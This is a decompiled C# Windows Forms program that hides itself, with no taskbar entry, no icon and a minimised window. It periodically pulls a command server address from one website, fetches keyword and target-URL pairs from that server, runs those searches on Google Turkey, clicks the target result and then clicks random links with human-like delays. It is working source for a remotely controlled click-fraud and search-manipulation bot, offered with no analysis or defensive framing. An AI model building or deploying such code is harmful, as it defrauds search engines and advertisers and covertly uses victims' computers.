using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace BrowserDene;

public class Form1 : Form
{
	private string xxx;

	private KeyValuePair<string, string> _komut;

	private List<KeyValuePair<string, string>> _arananlar = new List<KeyValuePair<string, string>>();

	private IContainer components = null;

	private WebBrowser webBrowser1;

	private Timer timer1;

	public Form1()
	{
		InitializeComponent();
	}

	private void SetText(string attribute, string attName, string value)
	{
		//IL_003c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		if (!(webBrowser1.get_Document() != (HtmlDocument)null))
		{
			return;
		}
		HtmlElementCollection elementsByTagName = webBrowser1.get_Document().GetElementsByTagName("input");
		foreach (HtmlElement item in elementsByTagName)
		{
			HtmlElement val = item;
			if (val.GetAttribute(attribute).Equals(attName))
			{
				val.SetAttribute("value", value);
			}
		}
	}

	private void ClickButton(string attribute, string attName)
	{
		//IL_003c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		if (!(webBrowser1.get_Document() != (HtmlDocument)null))
		{
			return;
		}
		HtmlElementCollection elementsByTagName = webBrowser1.get_Document().GetElementsByTagName("input");
		foreach (HtmlElement item in elementsByTagName)
		{
			HtmlElement val = item;
			if (val.GetAttribute(attribute).Equals(attName))
			{
				val.InvokeMember("click");
			}
		}
	}

	private bool ClickLink(string attribute, string attName, string url)
	{
		//IL_0055: Unknown result type (might be due to invalid IL or missing references)
		//IL_005c: Expected O, but got Unknown
		bool result = false;
		if (webBrowser1.get_Document() != (HtmlDocument)null)
		{
			HtmlElement elementById = webBrowser1.get_Document().GetElementById("ires");
			HtmlElementCollection elementsByTagName = elementById.GetElementsByTagName("a");
			List<HtmlElement> list = new List<HtmlElement>();
			foreach (HtmlElement item in elementsByTagName)
			{
				HtmlElement val = item;
				string attribute2 = val.GetAttribute("href");
				if (!attribute2.Contains("//webcache.googleusercontent.com") && !attribute2.Contains("&q=related:"))
				{
					list.Add(val);
				}
			}
			{
				foreach (HtmlElement item2 in list)
				{
					string attribute2 = item2.GetAttribute("href");
					if (attribute2.Contains(url))
					{
						item2.InvokeMember("click");
						return true;
					}
				}
				return result;
			}
		}
		return result;
	}

	public void webBrowser1_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
	{
		string text = e.get_Url().ToString();
		Random random = new Random();
		if (text == "http://www.google.com.tr/" && _komut.Value != "" && xxx != "")
		{
			SetText("name", "q", _komut.Key);
			Thread.Sleep(random.Next(1000, 2000));
			ClickButton("name", "btnK");
		}
		else if (text.StartsWith("http://www.google.com.tr/search?") && !text.Contains("&start="))
		{
			Thread.Sleep(random.Next(5000, 8000));
			if (!ClickLink("class", "l", _komut.Value))
			{
				Ilerle(text);
			}
		}
		else if (text.StartsWith("http://www.google.com.tr/search?") && text.Contains("&start="))
		{
			Thread.Sleep(random.Next(5000, 8000));
			if (!ClickLink("class", "l", _komut.Value))
			{
				Ilerle(text);
			}
		}
		else if (text.Contains(_komut.Value))
		{
			Thread.Sleep(random.Next(10000, 25000));
			RastGeleGez();
		}
	}

	private void RastGeleGez()
	{
		if (webBrowser1.get_Document() != (HtmlDocument)null)
		{
			HtmlElementCollection elementsByTagName = webBrowser1.get_Document().GetElementsByTagName("a");
			Random random = new Random();
			elementsByTagName.get_Item(random.Next(elementsByTagName.get_Count() - 1)).InvokeMember("click");
		}
	}

	private void Ilerle(string ensonurl)
	{
		if (webBrowser1.get_Document() != (HtmlDocument)null)
		{
			Regex regex = new Regex("&start=(.*)", RegexOptions.IgnoreCase | RegexOptions.Compiled);
			Match match = regex.Match(ensonurl);
			string text = match.Groups[1].ToString();
			if (text != "")
			{
				int num = int.Parse(text) + 10;
				string text2 = ensonurl.Replace("start=" + text, "start=" + num);
				webBrowser1.Navigate(text2);
			}
			else
			{
				webBrowser1.Navigate(ensonurl + "&start=10");
			}
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		Utils.DisableClickSounds();
		basla();
	}

	private string nereden(string anaurl)
	{
		string result = "";
		WebHeaderCollection webHeaderCollection = new WebHeaderCollection();
		webHeaderCollection.Add("User-Agent", "Mozilla/4.0 (compatiple; MSIE 6.0; Windows NT 5.1)");
		WebHeaderCollection headers = webHeaderCollection;
		WebClient webClient = new WebClient();
		webClient.Encoding = Encoding.Default;
		webClient.Headers = headers;
		using (WebClient webClient2 = webClient)
		{
			try
			{
				string input = webClient2.DownloadString(anaurl);
				Regex regex = new Regex("1(.*?)2", RegexOptions.IgnoreCase | RegexOptions.Compiled);
				Match match = regex.Match(input);
				result = match.Groups[1].ToString();
			}
			catch (Exception)
			{
			}
		}
		return result;
	}

	private void KomutAl()
	{
		WebHeaderCollection webHeaderCollection = new WebHeaderCollection();
		webHeaderCollection.Add("User-Agent", "Mozilla/4.0 (compatiple; MSIE 6.0; Windows NT 5.1)");
		WebHeaderCollection headers = webHeaderCollection;
		WebClient webClient = new WebClient();
		webClient.Encoding = Encoding.Default;
		webClient.Headers = headers;
		using WebClient webClient2 = webClient;
		try
		{
			string text = webClient2.DownloadString("http://" + xxx + "/v4/v4.php");
			string[] array = text.Split(new char[1] { '|' });
			KeyValuePair<string, string> keyValuePair = new KeyValuePair<string, string>(array[0], array[1]);
			if (!_arananlar.Contains(keyValuePair))
			{
				_komut = keyValuePair;
				_arananlar.Add(_komut);
				return;
			}
			timer1.set_Enabled(false);
			Thread.Sleep(300000);
			KomutAl();
			timer1.set_Enabled(true);
		}
		catch (Exception)
		{
		}
	}

	private void basla()
	{
		xxx = nereden("http://www.biletalin.com");
		KomutAl();
		webBrowser1.Navigate("http://www.google.com.tr");
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		basla();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_00a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ac: Expected O, but got Unknown
		components = new Container();
		webBrowser1 = new WebBrowser();
		timer1 = new Timer(components);
		((Control)this).SuspendLayout();
		((Control)webBrowser1).set_Dock((DockStyle)5);
		((Control)webBrowser1).set_Location(new Point(0, 0));
		((Control)webBrowser1).set_MinimumSize(new Size(20, 20));
		((Control)webBrowser1).set_Name("webBrowser1");
		((Control)webBrowser1).set_Size(new Size(863, 351));
		((Control)webBrowser1).set_TabIndex(0);
		webBrowser1.add_DocumentCompleted(new WebBrowserDocumentCompletedEventHandler(webBrowser1_DocumentCompleted));
		timer1.set_Enabled(true);
		timer1.set_Interval(300000);
		timer1.add_Tick((EventHandler)timer1_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(863, 351));
		((Control)this).get_Controls().Add((Control)(object)webBrowser1);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Form1");
		((Form)this).set_WindowState((FormWindowState)1);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
